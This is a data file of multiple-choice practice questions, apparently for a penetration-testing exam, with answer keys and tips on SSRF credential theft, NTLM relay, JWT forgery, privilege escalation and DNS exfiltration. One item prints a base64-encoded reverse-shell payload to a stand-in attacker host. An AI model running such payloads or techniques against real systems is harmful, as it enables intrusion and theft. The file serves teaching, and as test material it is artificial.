{
  "category": "penplus",
  "testId": 7,
  "testName": "Practice Test #7 (Very Challenging)",
  "xpPerCorrect": 30,
  "questions": [
    {
      "id": 1,
      "question": "A penetration tester exploits an SSRF vulnerability and accesses the AWS metadata service. What is the MOST impactful next action?",
      "options": [
        "Retrieve IAM role credentials and use them to escalate privileges within AWS",
        "Enumerate the running EC2 instances to identify exposed web services",
        "List available S3 buckets to search for sensitive documents",
        "Check security group configurations to identify firewall misconfigurations"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Accessing IAM credentials via AWS metadata provides immediate cloud-level access, making it the most impactful next step. Enumerating EC2 instances, listing S3 buckets, or checking security groups are useful, but secondary.",
      "examTip": "AWS EC2 metadata IAM credentials typically enable rapid escalation—always prioritize retrieval."
    },
    {
      "id": 2,
      "question": "Review the payload snippet:\n\n```bash\n$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQzIDA+JjEp | base64 -d | sh)\n```\n\nWhat's the primary objective of this payload?",
      "options": [
        "Establish a reverse shell connection to the attacker’s server",
        "Download and execute a fileless cryptocurrency miner",
        "Perform DNS-based data exfiltration",
        "Create a hidden cron job for persistence"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The decoded payload establishes a reverse shell (`bash -i >& /dev/tcp/attacker.com/443 0>&1`). Cryptocurrency miners, DNS exfiltration, or cron persistence are plausible but incorrect here.",
      "examTip": "Reverse shells often appear in base64-encoded or obfuscated formats; decoding them is key to identifying the intent."
    },
    {
      "id": 3,
      "question": "An attacker captures the following traffic:\n\n```\nAuthorization: Negotiate TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==\n```\n\nWhich attack is MOST likely feasible given this capture?",
      "options": [
        "NTLM relay attacks if SMB signing is disabled",
        "Kerberoasting attack using the captured data",
        "Pass-the-ticket attack using extracted Kerberos data",
        "Golden Ticket creation using the captured NTLM challenge"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Captured NTLM negotiation headers can facilitate NTLM relay if SMB signing is disabled. Kerberoasting and pass-the-ticket require Kerberos tickets, while Golden Tickets require compromised domain credentials.",
      "examTip": "Recognizing NTLM negotiation headers helps determine feasibility of NTLM relay attacks."
    },
    {
      "id": 4,
      "question": "Which Linux command MOST directly identifies potential privilege escalation vectors involving writable files?",
      "options": [
        "`find / -writable -type f 2>/dev/null`",
        "`ls -la /etc/passwd /etc/shadow`",
        "`grep -R \"password\" /home/*/.bash_history`",
        "`cat /proc/self/environ | grep USER`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`find / -writable -type f` directly reveals files writable by the current user, indicating possible privilege escalation vectors. Inspecting `/etc/passwd` permissions, bash history, or environment variables are plausible but less direct methods.",
      "examTip": "Always perform targeted enumeration for writable files—these often lead directly to privilege escalation."
    },
    {
      "id": 5,
      "question": "An attacker intercepts and modifies a JWT token by changing the algorithm header to 'none'. What's the attacker’s PRIMARY goal?",
      "options": [
        "Forging tokens without needing the original secret",
        "Initiating replay attacks against the JWT implementation",
        "Enabling token session fixation via manipulated headers",
        "Triggering an XSS vulnerability via crafted JWT payloads"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Changing JWT header algorithm to 'none' enables token forgery without knowing the secret. Replay, fixation, and XSS are plausible distractors but unrelated to algorithm header manipulation.",
      "examTip": "Disallow JWT tokens with algorithm set to 'none' to prevent trivial token forgery."
    },
    {
      "id": 6,
      "question": "A penetration tester accesses a writable service executable running as SYSTEM on Windows. What's the MOST direct exploitation path?",
      "options": [
        "Replace the executable with a malicious binary for SYSTEM-level code execution",
        "Inject malicious code into the executable memory using process hollowing",
        "Perform reflective DLL injection into the executable process",
        "Change registry permissions related to the service for privilege escalation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Replacing the executable binary itself directly provides SYSTEM-level privileges immediately. Hollowing, DLL injection, or registry permission changes are effective but less direct.",
      "examTip": "Writable SYSTEM-level executables are prime privilege escalation targets—replace them with malicious payloads directly."
    },
    {
      "id": 7,
      "question": "Which data exfiltration method is MOST covert and effective when DNS monitoring is weak?",
      "options": [
        "Encoding sensitive information within DNS query subdomains",
        "Encrypting files and transferring via HTTPS POST requests",
        "Fragmenting data across multiple ICMP echo requests",
        "Uploading exfiltrated data via cloud service provider APIs"
      ],
      "correctAnswerIndex": 0,
      "explanation": "DNS tunneling through query subdomains is highly effective and covert if DNS inspection is insufficient. HTTPS, ICMP, or cloud uploads are plausible but typically more detectable.",
      "examTip": "DNS tunneling via subdomains can easily bypass weak DNS monitoring—closely scrutinize DNS traffic for anomalies."
    },
    {
      "id": 8,
      "question": "What is the primary purpose of running `sudo -l` immediately after gaining a limited shell on Linux?",
      "options": [
        "Enumerating allowed privileged commands for possible escalation",
        "Displaying current logged-in users for lateral movement",
        "Listing current sudo version to identify known vulnerabilities",
        "Checking system resource limits that may hinder exploits"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`sudo -l` lists commands the current user can execute as root without a password, directly indicating escalation opportunities. Users, sudo version, and resource limits are plausible but less direct.",
      "examTip": "`sudo -l` is a critical first enumeration command after gaining initial Linux access, as it quickly reveals immediate escalation paths."
    }
  ]
}

